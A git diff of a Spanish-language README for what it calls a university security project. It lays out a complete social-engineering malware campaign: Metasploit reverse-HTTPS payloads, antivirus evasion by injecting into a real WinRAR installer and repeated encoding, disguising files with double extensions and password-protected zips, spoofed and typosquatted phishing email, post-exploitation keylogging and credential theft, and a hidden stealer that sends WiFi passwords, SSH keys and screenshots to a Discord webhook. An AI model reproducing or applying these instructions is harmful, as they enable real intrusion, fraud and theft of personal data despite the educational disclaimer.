@@ -1,270 +1,278 @@
-# Proyecto Grupo 4 - Generación de Payload con Evasión de Antivirus e Ingeniería Social
+# Proyecto Grupo 4 - Ingeniería Social, Payload y Extracción de Información
 
-> **Educational purposes only.** Este repositorio fue creado como proyecto académico para la materia de Seguridad Informática. Todo el contenido tiene como único objetivo demostrar conceptos de ciberseguridad ofensiva en un entorno controlado y con autorización explícita. No usar contra sistemas sin permiso escrito del propietario.
-
-Este proyecto demuestra el flujo completo de un ataque de ingeniería social usando Metasploit. Se genera un archivo malicioso, se disfraza para que parezca legítimo, se envía a la víctima mediante correo o red social, y una vez que lo ejecuta se obtiene acceso completo al sistema para extraer la información requerida. Todo se hace desde Kali Linux.
+> **Educational purposes only.** Este repositorio fue desarrollado como proyecto académico para la materia de Seguridad Informática. Todo el contenido existe para demostrar conceptos de ciberseguridad ofensiva en entornos controlados y con autorización explícita. Usar estas técnicas contra sistemas sin permiso escrito del propietario es ilegal.
 
 ---
 
-## Requisitos e instalación
+## ¿De qué trata este proyecto?
 
-Necesitas tener Kali Linux corriendo. Si usas la configuración del grupo, abre el archivo KaliLinux.exe del escritorio y Kali carga en pantalla completa automáticamente.
+Un atacante puede obtener acceso completo a la computadora de otra persona sin hackear ningún sistema, sin explotar vulnerabilidades técnicas, y sin que el antivirus haga nada. Solo necesita que esa persona abra un archivo.
 
-Una vez dentro de Kali, abre la terminal y ejecuta el script de configuración que viene en este repositorio. Ese script instala todo lo que necesitas de una sola vez:
+Eso es ingeniería social: manipular a las personas en lugar de atacar las máquinas.
+
+Este proyecto demuestra el flujo completo de ese proceso. Se crea un archivo que parece legítimo, se le envía a la víctima mediante correo o red social, y en el momento en que lo abre el atacante obtiene información del sistema, contraseñas de WiFi, capturas de pantalla y más, todo enviado en tiempo real a un canal de Discord.
+
+---
+
+## Diagrama del ataque
+
+```
+ATACANTE (Kali Linux)                        VÍCTIMA (Windows/Linux)
+─────────────────────────────────────────────────────────────────────
+                                                
+  1. Genera el payload                         
+     msfvenom → archivo.exe                   
+                                                
+  2. Disfraza el archivo                       
+     le cambia el ícono, lo                   
+     comprime con contraseña                  
+                                                
+  3. Envía por ingeniería social               
+     ──── correo "oficial" ──────────────────► 4. Víctima abre el correo
+     ──── link de Drive ──────────────────────► 5. Víctima descarga el archivo
+                                                   6. Víctima ejecuta el archivo
+                                                
+  8. Recibe la conexión ◄────────────────────── 7. El archivo llama al atacante
+     sesión Meterpreter                             por HTTPS (puerto 443)
+                                                
+  9. Extrae información:                       
+     - sysinfo (sistema operativo)            
+     - getuid + SID (usuario)                 
+     - dir (directorio actual)                
+     - WiFi, procesos, screenshot             
+                                                
+  10. Todo llega a Discord ◄──────── stealer.py corre en segundo plano
+      en tiempo real                          
+```
+
+---
+
+## Herramientas que se usan
+
+`Kali Linux` es el sistema operativo del atacante. Viene con todas las herramientas de seguridad preinstaladas.
+
+`Metasploit Framework` es una suite de herramientas para pruebas de penetración. Incluye `msfvenom` para crear payloads y `msfconsole` para recibir conexiones.
+
+`msfvenom` es el generador de payloads. Crea el archivo malicioso con el tipo de conexión, la IP destino y el puerto configurados.
+
+`Meterpreter` es el tipo de sesión que se establece una vez que la víctima abre el archivo. Da acceso a comandos para explorar y extraer información del sistema.
+
+`swaks` es una herramienta de línea de comandos para enviar correos desde cualquier dirección.
+
+`Discord Webhook` es una URL que Discord te da para que aplicaciones externas puedan enviar mensajes a un canal. Lo usamos para recibir los datos robados en tiempo real.
+
+---
+
+## Estructura del repositorio
+
+```
+grupo4-seguridad/
+│
+├── README.md               este archivo - explicación completa del proyecto
+├── setup.sh                instala todas las dependencias en Kali de una sola vez
+├── generar_payload.sh      genera el payload de Metasploit pidiendo la IP
+├── listener.rc             configura el handler de Metasploit automáticamente
+│
+├── stealer.py              stealer multiplataforma en Python
+│                           corre directo en Kali y compila a .exe para Windows
+│
+└── capturas/               carpeta para las screenshots del proyecto funcionando
+```
+
+---
+
+## Paso 1 - Preparar el entorno
+
+Ejecuta el script de configuración que instala todo lo necesario:
 
 ```
 bash setup.sh
 ```
 
-Si prefieres instalar manualmente, los paquetes que necesitas son estos:
+O de forma manual:
 
 ```
 sudo apt-get update
-sudo apt-get install -y metasploit-framework swaks icoutils zip wget
+sudo apt-get install -y metasploit-framework swaks icoutils zip wget python3 python3-pip
+pip3 install pillow requests pyinstaller
 ```
 
-`metasploit-framework` es la suite principal que incluye msfvenom y msfconsole.
-
-`swaks` es una herramienta de línea de comandos para enviar correos con cualquier remitente que quieras poner.
-
-`icoutils` sirve para manipular íconos de ejecutables de Windows directamente desde Linux.
-
-`zip` para comprimir el payload con contraseña antes de enviarlo.
-
-`wget` para descargar archivos desde la terminal, lo usamos para bajar instaladores reales que sirven de plantilla.
-
 ---
 
-## Paso 1 - Entender qué es un payload y cómo funciona
+## Paso 2 - Conocer tu IP
 
-Un payload es un archivo que parece inocente pero que cuando alguien lo abre ejecuta código en segundo plano. En este proyecto usamos el tipo `reverse_https`, que funciona así: el archivo que le mandamos a la víctima no abre conexiones desde tu lado, sino que es la computadora de la víctima la que llama a la tuya. Esto es importante porque la mayoría de los firewalls bloquean conexiones entrantes pero permiten las salientes, y una conexión saliente por el puerto 443 parece tráfico web normal.
+El payload necesita saber a qué dirección llamar cuando la víctima lo abra.
 
-El flujo completo es este:
-
-La víctima abre el archivo. El archivo hace una conexión HTTPS hacia tu IP en el puerto 443. Tu computadora estaba esperando esa conexión con el listener activo. Se establece el canal y desde ese momento tienes acceso a la máquina de la víctima mediante una sesión de Meterpreter.
-
----
-
-## Paso 2 - Conocer tu IP antes de generar el payload
-
-El payload necesita saber a qué dirección conectarse cuando alguien lo abra. Esa dirección es la tuya y tienes que definirla antes de generar el archivo.
-
-Para ver tu IP dentro de la red local:
+Para ver tu IP en la red local:
 
 ```
 ip a
 ```
 
-Busca la interfaz que se llama eth0 o ens33 y anota el número que aparece después de inet. Por ejemplo `192.168.1.15`.
+El número que aparece después de `inet` en la interfaz `eth0` es tu IP local. Por ejemplo `192.168.1.15`.
 
-Si la víctima está en otra red, por ejemplo la vas a atacar por internet y no están en el mismo wifi, necesitas tu IP pública:
+Si la víctima está en otra red y van a hacer la prueba por internet:
 
 ```
 curl ifconfig.me
 ```
 
-Si estás en una red donde tu IP pública cambia o no tienes acceso al router para abrir puertos, puedes usar ngrok para crear un túnel. Ngrok te da una dirección pública fija que redirige hacia tu máquina:
+Si no puedes abrir puertos en el router, usa ngrok para crear un túnel:
 
 ```
 ngrok tcp 443
 ```
 
-Ngrok te muestra algo como `0.tcp.ngrok.io:12345`. En ese caso tu LHOST sería `0.tcp.ngrok.io` y tu LPORT sería `12345`.
+Ngrok te da una dirección pública como `0.tcp.ngrok.io:12345`. En ese caso tu LHOST es `0.tcp.ngrok.io` y tu LPORT es `12345`.
 
 ---
 
-## Paso 3 - Generar el payload
+## Paso 3 - Generar el payload con Metasploit
 
-Usa el script del repositorio que te muestra tu IP y genera el archivo automáticamente:
+Usa el script del repositorio:
 
 ```
 bash generar_payload.sh
 ```
 
-O si prefieres hacerlo manualmente, el comando base es este:
+O el comando manualmente:
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f exe -o payload_base.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f exe -o actualizacion_sistema.exe
 ```
 
-Lo que hace cada parte:
+Explicación de cada parámetro:
 
-`msfvenom` es el generador de payloads de Metasploit.
+`-p windows/x64/meterpreter/reverse_https` define el tipo de payload. Windows porque la víctima usa Windows. x64 porque es de 64 bits. reverse_https significa que la víctima es la que llama al atacante, no al revés, lo que evita los firewalls. HTTPS hace que el tráfico parezca navegación web normal.
 
-`-p windows/x64/meterpreter/reverse_https` define el tipo de payload. Windows porque apunta a víctimas con Windows, x64 porque es de 64 bits que es lo más común hoy en día, meterpreter es el tipo de sesión que obtienes una vez que alguien lo abre y te da muchas herramientas, reverse_https significa que la víctima llama a tu máquina usando el protocolo HTTPS.
+`LHOST` es tu IP, la dirección a la que se conecta la víctima.
 
-`LHOST` es tu IP.
+`LPORT 443` es el puerto estándar de HTTPS, ningún firewall lo bloquea.
 
-`LPORT 443` es el puerto. El 443 es el estándar de HTTPS, no levanta sospechas.
+`-f exe` define el formato del archivo de salida.
 
-`-f exe` define el formato del archivo de salida, en este caso un ejecutable de Windows.
-
-`-o payload_base.exe` es el nombre del archivo que se crea.
-
-Si la víctima tiene Windows de 32 bits, cambias `x64` por `x86` en el payload:
-
-```
-msfvenom -p windows/x86/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f exe -o payload_base.exe
-```
+`-o actualizacion_sistema.exe` es el nombre del archivo que se crea.
 
 ---
 
 ## Paso 4 - Evadir el antivirus
 
-El payload que genera msfvenom por defecto es detectado por la mayoría de antivirus porque su firma ya está en las bases de datos. Para que el archivo pase los filtros hay varias técnicas y se pueden combinar.
+El archivo que genera msfvenom por defecto es detectado porque su firma ya está en las bases de datos de los antivirus. Para pasarlo hay varias técnicas.
 
-La primera técnica es inyectar el payload dentro de un ejecutable legítimo. Metasploit puede meter el código malicioso dentro de un programa real de Windows de forma que cuando la víctima lo ejecuta, el programa original funciona normalmente y al mismo tiempo el payload se activa en segundo plano. El resultado hereda el ícono y el comportamiento del programa original, lo que lo hace mucho más creíble y más difícil de detectar.
+**Técnica 1 - Inyectar en un ejecutable legítimo:**
 
-Primero descargas un instalador real:
+Descargas un instalador real de cualquier programa conocido:
 
 ```
 wget https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -O instalador_real.exe
 ```
 
-Luego generas el payload inyectado:
+Generas el payload inyectado dentro de ese instalador:
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -x instalador_real.exe -k -f exe -o instalador_infectado.exe
 ```
 
-El parámetro `-x` le dice a msfvenom que use ese ejecutable como plantilla. El parámetro `-k` hace que el proceso original del instalador siga corriendo normalmente mientras el payload se ejecuta en segundo plano. La víctima ve que WinRAR se instaló sin problemas y no sospecha nada.
+El `-x` indica que use ese archivo como plantilla. El `-k` hace que el instalador original funcione normalmente mientras el payload corre en segundo plano. La víctima ve WinRAR instalarse sin problema.
 
-La segunda técnica es usar un encoder para ofuscar el código. El encoder modifica los bytes del payload para que su firma cambie y los antivirus no lo reconozcan:
+**Técnica 2 - Encoders para ofuscar el código:**
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -e x64/xor_dynamic -i 15 -f exe -o payload_encoded.exe
 ```
 
-El parámetro `-e x64/xor_dynamic` define el encoder. El parámetro `-i 15` le dice que pase el encoder 15 veces seguidas, lo que hace que la firma cambie más profundamente.
+El `-e x64/xor_dynamic` es el encoder. El `-i 15` le dice que pase el encoder 15 veces para que la firma cambie más.
 
-La tercera técnica es cambiar el formato de entrega. En lugar de un .exe, generas un archivo HTA que es una aplicación HTML que Windows ejecuta nativamente. Los antivirus escanean los .exe con mucha más agresividad que los .hta:
+**Técnica 3 - Formato HTA en lugar de EXE:**
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=TU_IP LPORT=443 -f hta-psh -o documento.hta
 ```
 
-La cuarta técnica y la más efectiva es combinar todas las anteriores: inyectar en un ejecutable real, aplicar un encoder con varias iteraciones, y verificar el resultado antes de enviarlo.
+Los archivos HTA los ejecuta Windows nativamente y los antivirus los escanean con menos agresividad que los EXE.
 
-Para verificar cuántos antivirus detectan tu payload sin que los fabricantes reciban la muestra, usa este sitio:
+**Verificar la detección antes de enviar:**
+
+Sube el archivo a antiscan.me, no a VirusTotal. VirusTotal comparte las muestras con los fabricantes de antivirus lo que quema el payload en horas. Antiscan.me no comparte nada.
 
 ```
 https://antiscan.me
 ```
 
-Es importante usar antiscan.me y no VirusTotal para las pruebas. VirusTotal comparte las muestras con los fabricantes de antivirus, lo que haría que tu payload quede quemado en pocas horas. Antiscan.me no comparte nada.
+---
+
+## Paso 5 - Disfrazar el archivo
+
+**Doble extensión:**
+
+Windows oculta las extensiones de archivo por defecto. Si el archivo se llama `Informe_Final.pdf.exe`, la víctima solo ve `Informe_Final.pdf`. Para aplicar esto solo renombras el archivo.
+
+**Cambiar el ícono:**
+
+Descarga un ícono de PDF en formato .ico y cámbiaselo al ejecutable:
+
+```
+sudo apt-get install icoutils
+icotool -x icono_pdf.ico
+```
+
+O la forma más rápida: si ya inyectaste el payload en WinRAR, el archivo hereda el ícono de WinRAR automáticamente.
+
+**Comprimir con contraseña:**
+
+```
+zip -e Informe_Final.zip Informe_Final.pdf.exe
+```
+
+El escáner del servidor de correo no puede ver dentro de un zip con contraseña. Pones la contraseña en el cuerpo del correo.
 
 ---
 
-## Paso 5 - Hacer el archivo más convincente visualmente
+## Paso 6 - Configurar el listener antes de enviar
 
-Aunque el payload no sea detectado por el antivirus, si la víctima ve un archivo llamado `payload.exe` no lo va a abrir. El archivo tiene que parecer algo que la víctima esperaría recibir.
+El listener tiene que estar activo antes de que la víctima abra el archivo.
 
-El truco de la doble extensión funciona porque Windows tiene ocultas las extensiones de archivo por defecto. Si el archivo se llama así:
-
-```
-Informe_Financiero_2025.pdf.exe
-```
-
-En el explorador de Windows la víctima solo ve esto:
-
-```
-Informe_Financiero_2025.pdf
-```
-
-Para que además tenga el ícono de PDF, primero descargas un ícono en formato .ico:
-
-```
-wget https://www.iconsdb.com/icons/download/red/pdf-icon.ico -O pdf.ico
-```
-
-Luego le cambias el ícono al ejecutable con wrestool que viene en icoutils:
-
-```
-icotool -x pdf.ico
-wrestool -R --name=MAINICON -t14 instalador_infectado.exe
-```
-
-O la forma más directa para la demo, si ya inyectaste el payload en un instalador de WinRAR, el archivo ya hereda el ícono de WinRAR automáticamente y solo renombras el archivo con la doble extensión.
-
-Después de darle el nombre y el ícono, comprimes el archivo en un zip con contraseña:
-
-```
-zip -e Informe_Financiero_2025.zip Informe_Financiero_2025.pdf.exe
-```
-
-El comando te pide que elijas una contraseña. Usa algo simple como `1234` o `2025` porque se la vas a decir a la víctima en el correo. La razón de usar el zip con contraseña es que los escáneres de los servidores de correo no pueden ver el contenido de un zip protegido, así que el archivo pasa sin ser analizado.
-
----
-
-## Paso 6 - Configurar el listener antes de enviar el archivo
-
-El listener tiene que estar activo antes de que la víctima abra el archivo. Si alguien lo abre y tu listener no está corriendo, la conexión se pierde y no recuperas la sesión.
-
-Forma automática con el script del repositorio:
+Forma automática:
 
 ```
 msfconsole -r listener.rc
 ```
 
-Forma manual, abriendo msfconsole y escribiendo cada comando:
+Forma manual:
 
 ```
 msfconsole
 ```
 
-Una vez que carga, los comandos son estos uno por uno:
+Dentro de msfconsole, uno por uno:
 
 ```
 use exploit/multi/handler
 ```
 
-Selecciona el módulo que recibe conexiones entrantes.
+Selecciona el módulo que espera conexiones entrantes.
 
 ```
 set payload windows/x64/meterpreter/reverse_https
 ```
 
-Define el tipo de conexión que vas a recibir. Tiene que ser exactamente el mismo payload que usaste al generar el archivo.
+Tiene que coincidir exactamente con el payload que generaste.
 
 ```
 set LHOST 0.0.0.0
-```
-
-El `0.0.0.0` significa que acepta conexiones en cualquier interfaz de red de tu máquina.
-
-```
 set LPORT 443
-```
-
-El mismo puerto del payload.
-
-```
 set ExitOnSession false
-```
-
-Hace que el listener siga activo después de recibir una conexión. Útil si hay más de una víctima en la demo.
-
-```
 set AutoRunScript post/windows/gather/enum_system
-```
-
-Ejecuta automáticamente el módulo de reconocimiento del sistema cuando alguien conecta. Así la información del sistema aparece sola en pantalla sin que tengas que escribir nada extra durante la demo.
-
-```
 run
 ```
 
-Inicia el listener. A partir de este momento tu computadora está esperando la conexión.
+`ExitOnSession false` mantiene el listener activo después de recibir la primera conexión. `AutoRunScript` corre automáticamente el módulo de reconocimiento cuando alguien conecta, así la información del sistema aparece sola.
 
 ---
 
-## Paso 7 - Enviar el archivo mediante ingeniería social
+## Paso 7 - Enviar el archivo usando ingeniería social
 
-Hay tres formas de hacer esto y cada una tiene sus ventajas.
-
-La primera es mediante correo electrónico con swaks, haciéndolo parecer que viene de alguien de confianza.
-
-Swaks te deja poner cualquier dirección como remitente aunque no tengas acceso a esa cuenta. Esto funciona porque muchos servidores de correo no verifican que el remitente sea real. El comando completo es este:
+**Por correo con swaks (suplantando cualquier remitente):**
 
 ```
 swaks --to victima@correo.com \
@@ -276,280 +284,201 @@ swaks --to victima@correo.com \
       --tls \
       --header "Subject: Documento compartido - revisión requerida" \
       --header "From: Soporte TI <soporte.ti@empresa.com>" \
-      --body "Hola,\n\nTe comparto el documento actualizado. La contraseña del archivo es: 1234\n\nSaludos,\nEquipo de Soporte" \
-      --attach Informe_Financiero_2025.zip
+      --body "Hola,\n\nDocumento adjunto. Contraseña del archivo: 1234\n\nSaludos" \
+      --attach Informe_Final.zip
 ```
 
-Para usar Gmail como servidor necesitas crear una contraseña de aplicación en tu cuenta de Google porque Gmail ya no acepta tu contraseña normal desde aplicaciones externas. Vas a myaccount.google.com, buscas Seguridad, luego Verificación en dos pasos, y al final encuentras Contraseñas de aplicaciones. Generas una y esa es la que pones en `--auth-password`.
+Para usar Gmail necesitas crear una contraseña de aplicación en myaccount.google.com, sección Seguridad, Verificación en dos pasos, Contraseñas de aplicaciones.
 
-La dirección del remitente que ves en el correo, en este caso `soporte.ti@empresa.com`, puede ser cualquier cosa que quieras. La víctima ve ese nombre y esa dirección, no ve que el correo salió de tu cuenta de Gmail.
+La dirección del remitente visible puede ser cualquier cosa. La víctima ve el nombre que pongas.
 
-La segunda forma es usando un dominio propio que se parezca al de la empresa real. Esto se llama typosquatting. Registras un dominio por unos tres dólares en cualquier registrador como Namecheap o Porkbun. Si la empresa de la víctima usa `empresa.com`, tú registras algo como `empresa-soporte.com`, `empresa.net`, o `soporte-empresa.com`. Luego configuras ese dominio con un servicio de correo gratuito como Zoho Mail y mandas el correo directamente desde esa dirección. El correo pasa todos los filtros porque viene de un dominio real con registros SPF y DKIM configurados, y visualmente parece legítimo.
+**Por link de Google Drive:**
 
-La tercera forma es la más limpia para la demo porque no tiene adjuntos sospechosos. Subes el archivo a Google Drive:
+Sube el archivo manualmente a drive.google.com, copia el link y mándalo en un correo simple. Drive no escanea ejecutables comprimidos. El correo no tiene adjuntos sospechosos, solo un link de Google.
 
-```
-El archivo lo subes manualmente desde el navegador a drive.google.com
-```
+**Por typosquatting:**
 
-Copias el link de descarga y lo mandas en un correo simple. Google Drive no escanea ejecutables comprimidos, solo analiza documentos de Office y PDFs. El correo queda así:
-
-```
-Asunto: Material de la clase - descarga pendiente
-
-Hola,
-
-Adjunto el material que faltaba de la clase de hoy. Descárgalo desde aquí:
-
-https://drive.google.com/file/d/XXXXXXXXXXXX/view
-
-Cualquier cosa me avisas.
-```
-
-Sin ningún adjunto, sin ningún archivo sospechoso, solo un link de Google. La mayoría de las personas hace clic sin pensarlo dos veces.
-
-Para hacer el correo todavía más convincente, agrégale una firma al final con nombre, cargo y número inventados:
-
-```
-María González
-Coordinadora Académica
-Tel: +52 55 1234 5678
-Universidad Tecnológica Nacional
-```
-
-Una firma con esos datos hace que el correo parezca completamente real.
+Registra un dominio parecido al real por unos tres dólares en Namecheap o Porkbun. Si la empresa usa `empresa.com` tú registras `empresa-soporte.com`. Configuras Zoho Mail en ese dominio y mandas el correo directamente. Pasa todos los filtros porque es un dominio real.
 
 ---
 
-## Paso 8 - Obtener la información del sistema requerida
+## Paso 8 - Obtener la información requerida por el proyecto
 
-Cuando la víctima ejecuta el archivo, en tu terminal de Metasploit aparece este mensaje:
+Cuando la víctima ejecuta el archivo, en tu terminal aparece:
 
 ```
 [*] Meterpreter session 1 opened (TU_IP:443 -> IP_VICTIMA:PUERTO)
 ```
 
-Eso significa que tienes acceso. Si configuraste el listener con el script del repositorio, el módulo `enum_system` ya corrió automáticamente y la información del sistema aparece en pantalla sola.
-
-Si lo configuraste manualmente, primero te conectas a la sesión:
+Conectarte a la sesión:
 
 ```
 sessions -i 1
 ```
 
-Luego ejecutas los comandos para obtener la información que pide el proyecto.
-
-Información general del sistema:
+Los comandos que pide el proyecto:
 
 ```
 sysinfo
 ```
 
-Muestra el nombre del equipo, la versión del sistema operativo, la arquitectura del procesador, el idioma del sistema y el dominio al que pertenece la máquina.
-
-Nombre del usuario actual:
+Muestra el nombre del equipo, versión del sistema operativo, arquitectura y dominio.
 
 ```
 getuid
 ```
 
-Muestra quién está usando la computadora en ese momento. El formato que muestra es `DOMINIO\usuario`.
-
-SID del usuario:
+Muestra el usuario actual con el formato DOMINIO\usuario.
 
 ```
 run post/windows/gather/enum_system
 ```
 
-Este módulo recopila toda la información del sistema incluyendo el SID completo de cada usuario, los grupos a los que pertenece, las interfaces de red, los procesos corriendo y la política de contraseñas del sistema.
-
-También puedes obtener el SID directamente abriendo una shell de Windows:
+Obtiene el SID completo, usuarios del sistema, grupos y configuración de red.
 
 ```
 shell
 whoami /user
-```
-
-El comando `whoami /user` muestra el nombre del usuario y su SID en una sola línea.
-
-Listado del directorio actual:
-
-```
-shell
 dir
 ```
 
-Con `shell` entras a la terminal de Windows dentro de la sesión. Con `dir` ves los archivos y carpetas del directorio donde está parado el usuario en ese momento.
-
-Para ver exactamente en qué directorio estás antes de listar:
-
-```
-pwd
-```
+`shell` abre una terminal de Windows. `whoami /user` muestra el nombre y SID en una línea. `dir` lista el directorio actual.
 
 ---
 
-## Paso 9 - Comandos adicionales de Meterpreter para la demo
+## Paso 9 - El stealer autónomo: stealer.py
 
-Estos comandos no los pide el proyecto pero los puedes mostrar en la expo para demostrar el alcance del acceso que se obtiene.
+El stealer es un programa independiente que no necesita Metasploit. Cuando alguien lo abre, en silencio recopila información y la manda a Discord. Lo más importante para la demo: **ves los datos llegar en tiempo real en tu teléfono**.
 
-Captura de pantalla de la pantalla de la víctima en tiempo real:
+**Lo que hace:**
+
+Obtiene el hostname, usuario, sistema operativo, IP local e IP pública. Extrae el SID del usuario en Windows o el UID/GID en Linux. Lista el contenido del directorio actual. Saca las contraseñas de todas las redes WiFi guardadas. Lista los procesos activos. En Linux lee el historial de bash y busca claves SSH. Toma una captura de pantalla completa. Todo llega a tu canal de Discord.
+
+**Cómo configurarlo:**
+
+Abre `stealer.py` y cambia la línea del webhook:
+
+```python
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
+```
+
+Para crear el webhook: Discord → tu servidor → clic derecho en un canal → Editar canal → Integraciones → Webhooks → Nuevo Webhook → Copiar URL.
+
+**Correrlo directamente en Kali para probarlo:**
+
+```
+pip3 install pillow requests
+python3 stealer.py
+```
+
+Los datos llegan a tu Discord en segundos.
+
+**Compilarlo a .exe para enviarlo a una víctima Windows:**
+
+```
+pip3 install pyinstaller
+pyinstaller --onefile --noconsole stealer.py
+```
+
+El `.exe` queda en la carpeta `dist/stealer.exe`. Es un ejecutable independiente que no necesita Python instalado en la máquina de la víctima.
+
+`--onefile` empaqueta todo en un solo archivo.
+
+`--noconsole` hace que corra sin abrir ninguna ventana, la víctima no ve nada.
+
+Para enviar el exe a la víctima aplica las mismas técnicas de los pasos 5 y 7.
+
+---
+
+## Paso 10 - Comandos adicionales de Meterpreter
+
+Estos no los pide el proyecto pero los puedes mostrar en la expo para demostrar el alcance real del acceso obtenido.
 
 ```
 screenshot
 ```
 
-Guarda una imagen de lo que está viendo la víctima en ese momento en tu máquina.
-
-Ver todos los procesos corriendo en la máquina de la víctima:
+Captura la pantalla de la víctima en tiempo real.
 
 ```
-ps
+keyscan_start
+keyscan_dump
+keyscan_stop
 ```
 
-Elevar privilegios si tienes acceso con un usuario normal:
+Activa, descarga y detiene un keylogger que registra todo lo que escribe la víctima.
 
 ```
 getsystem
 ```
 
-Intenta varios métodos para obtener privilegios de administrador o SYSTEM automáticamente.
-
-Activar un keylogger que registra todo lo que escribe la víctima:
-
-```
-keyscan_start
-```
-
-Para ver lo que escribió desde que activaste el keylogger:
-
-```
-keyscan_dump
-```
-
-Para detenerlo:
-
-```
-keyscan_stop
-```
-
-Ver las credenciales guardadas en el sistema como contraseñas de wifi, credenciales de Windows y tokens:
+Intenta elevar privilegios a SYSTEM, el nivel más alto en Windows.
 
 ```
 run post/windows/gather/credentials/credential_collector
 ```
 
-Descargar un archivo específico de la máquina de la víctima a la tuya:
+Extrae credenciales guardadas en el sistema.
 
 ```
-download C:\\Users\\victima\\Documents\\archivo.docx /home/kali/
+download C:\\ruta\\archivo.docx /home/kali/
 ```
 
-Subir un archivo desde tu máquina a la de la víctima:
-
-```
-upload /home/kali/archivo.txt C:\\Users\\victima\\Desktop\\
-```
+Descarga cualquier archivo de la máquina de la víctima.
 
 ---
 
-## Paso 10 - Qué hacer si la sesión no abre
+## Paso 11 - Qué hacer si la sesión no conecta
 
-Si la víctima ejecutó el archivo pero no aparece ninguna sesión en tu listener, hay varias cosas que revisar.
+Verifica que el LHOST y LPORT del payload coincidan exactamente con los del listener.
 
-Verifica que el LHOST y LPORT del payload coincidan exactamente con los del listener. Si generaste el payload con `LHOST=192.168.1.15` y el listener está en una interfaz diferente, la conexión no llega.
-
-Verifica que el puerto 443 esté disponible en tu máquina y no lo esté usando otro proceso:
+Verifica que el puerto no esté ocupado:
 
 ```
 sudo ss -tlnp | grep 443
 ```
 
-Si el antivirus de la víctima eliminó el archivo antes de que pudiera ejecutarse, necesitas aplicar más técnicas de evasión del Paso 4, especialmente la combinación de inyección en ejecutable real más encoder con múltiples iteraciones.
+Si el antivirus eliminó el archivo aplica más técnicas del Paso 4, especialmente la combinación de inyección en ejecutable real más encoder.
 
-Si estás probando en red local y la víctima no puede llegar a tu IP, verifica que ambas máquinas estén en el mismo segmento de red con:
+Verifica que ambas máquinas se pueden alcanzar:
 
 ```
-ping IP_TUYA
+ping TU_IP
 ```
 
 Ejecutado desde la máquina víctima.
 
-Si estás usando ngrok y la sesión se cae, es posible que ngrok haya restablecido el túnel y el puerto cambió. Hay que generar un nuevo payload con el nuevo puerto que asignó ngrok.
+Si usas ngrok verifica que el túnel sigue activo y que el puerto no cambió. Si cambió hay que generar el payload de nuevo con el nuevo puerto.
 
 ---
 
-## Paso 11 - Compilar y probar el stealer standalone
+## Glosario para el profesor y los estudiantes
 
-El archivo `stealer.cpp` es un programa independiente que no necesita Metasploit ni listener. Cuando la víctima lo abre, en silencio recopila toda la información del sistema y la manda directo a un canal de Discord mediante un webhook. Es perfecto para probar antes de la expo porque ves los datos llegar en tiempo real en tu teléfono o pantalla mientras alguien lo ejecuta.
+`Payload` es el código malicioso que se ejecuta en la máquina de la víctima. El nombre viene del inglés y significa "carga útil".
 
-Lo que hace el stealer cuando alguien lo abre:
+`Reverse shell` es una conexión donde la víctima llama al atacante, no al revés. Esto evita los firewalls que bloquean conexiones entrantes pero permiten las salientes.
 
-Recopila el nombre del equipo, el nombre del usuario, la versión del sistema operativo, la arquitectura del procesador y la RAM total. Obtiene el SID completo del usuario. Lista todos los archivos y carpetas del directorio donde se ejecutó el programa. Extrae las contraseñas de todas las redes WiFi que la máquina tiene guardadas. Lista los primeros veinte procesos corriendo en el sistema. Y al final toma una captura de pantalla de lo que está viendo la víctima y la sube como imagen al canal de Discord.
+`Meterpreter` es un tipo avanzado de reverse shell que da acceso a muchos comandos sin necesidad de subir archivos adicionales. Corre completamente en memoria y no deja rastros en el disco.
 
-Todo eso llega a tu Discord en cuestión de segundos sin que la víctima vea nada.
+`LHOST` (Listening Host) es la IP del atacante donde el payload va a conectarse.
 
-Para compilarlo necesitas estar dentro de Kali y tener mingw instalado, que es el compilador que convierte código C++ de Linux en ejecutables de Windows:
+`LPORT` (Listening Port) es el puerto en el que el atacante está escuchando. El 443 es el estándar de HTTPS.
 
-```
-sudo apt-get install mingw-w64
-```
+`Ingeniería social` es la técnica de manipular personas para que hagan algo, en este caso abrir un archivo. No explota vulnerabilidades técnicas, explota la confianza humana.
 
-Antes de compilar, abre el archivo y cambia la línea del webhook por el tuyo:
+`Handler` es el proceso en Metasploit que espera y recibe las conexiones del payload.
 
-```
-nano stealer.cpp
-```
+`Session` en Metasploit es la conexión activa con una máquina comprometida.
 
-Busca estas dos líneas cerca del principio:
+`SID` (Security Identifier) es el identificador único que Windows asigna a cada usuario y grupo. Se usa internamente para controlar permisos.
 
-```
-const std::wstring WEBHOOK_HOST = L"discord.com";
-const std::wstring WEBHOOK_PATH = L"/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN";
-```
+`Webhook` es una URL que un servicio te da para que otros programas puedan enviarle datos automáticamente. Discord los ofrece para integrar bots y notificaciones.
 
-Para crear un webhook en Discord: entra a tu servidor, haz clic derecho en cualquier canal de texto, selecciona Editar canal, luego entra a Integraciones, haz clic en Webhooks, y crea uno nuevo. Copia la URL que te da. La URL tiene este formato:
+`Encoder` en Metasploit es un módulo que modifica los bytes del payload para cambiar su firma y evitar la detección.
 
-```
-https://discord.com/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz
-```
+`Evasión de AV` son las técnicas para que un archivo malicioso pase los filtros del antivirus sin ser detectado.
 
-La parte que va después de `discord.com` es lo que pones en `WEBHOOK_PATH`. Quedaría así:
-
-```
-const std::wstring WEBHOOK_PATH = L"/api/webhooks/1234567890123456789/AbCdEfGhIjKlMnOpQrStUvWxYz";
-```
-
-Guardas el archivo con Ctrl+O y sales con Ctrl+X.
-
-Ahora lo compilas:
-
-```
-x86_64-w64-mingw32-g++ stealer.cpp -o stealer.exe \
-  -lwinhttp -lgdi32 -lole32 -loleaut32 -luuid \
-  -static -mwindows
-```
-
-El parámetro `-mwindows` hace que el exe se ejecute sin mostrar ninguna ventana de consola. La víctima no ve absolutamente nada cuando lo abre.
-
